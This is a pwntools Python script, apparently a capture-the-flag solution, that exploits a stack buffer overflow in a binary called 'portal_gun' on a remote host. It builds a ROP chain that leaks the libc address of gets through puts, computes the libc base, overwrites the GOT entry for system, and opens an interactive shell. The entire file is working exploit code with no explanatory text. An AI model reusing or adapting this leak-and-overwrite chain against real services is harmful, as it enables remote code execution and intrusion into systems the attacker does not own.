#!/usr/bin/env python
from pwn import *
import pwnlib.elf
import pwnlib.shellcraft


e = ELF('./portal_gun-43fcd0f6ae670ddb11a66bbfbca721410941ee30a5d1d802a6f509bcf7a765ac')
c = remote('60.250.197.227', 10002)
lib = ELF('./libc.so.6-cd7c1a035d24122798d97a47a10f6e2b71d58710aecfd392375f1aa9bdde164d')

#lib = ELF('/lib/libc-2.31.so')
#c = process('./portal_gun-43fcd0f6ae670ddb11a66bbfbca721410941ee30a5d1d802a6f509bcf7a765ac', env={'LD_PRELOAD': './hook.so-997c848132f9fae3a5ffdb0edf7c9071a0dcdebb99c116c5bd011efd28c942ae'})

context.terminal = ['alacritty', '-e', 'sh', '-c']
#gdb.attach(c)

#init
context.os='linux'
context.arch='amd64'
context.log_level ='debug'

ans = b'A' * (112 + 8) # fill buffer

# get gets location
p = p64(0x00000000004007a3) # pop rdi ; ret
p += p64(e.got['gets'])
p += p64(0x400560) # puts

# rehook system to exec
p += p64(0x00000000004007a3) # pop rdi ; ret
p += p64(e.got['system'])
p += p64(0x400580) # gets

# ret to call system
p += p64(0x4006e8)
p += p64(0x4006e8)

ans += p
c.sendline(ans)

# drip line
c.recvline()
c.recvline()

# get lib address
gets_addr = int.from_bytes(c.recvline(), "little") & 0x0000ffffffffffff
print(hex(gets_addr))

# write new system
lib_start = gets_addr - lib.symbols['gets']
lib_system = lib_start + lib.symbols['system']
c.sendline(p64(lib_system))

c.interactive()
c.close()
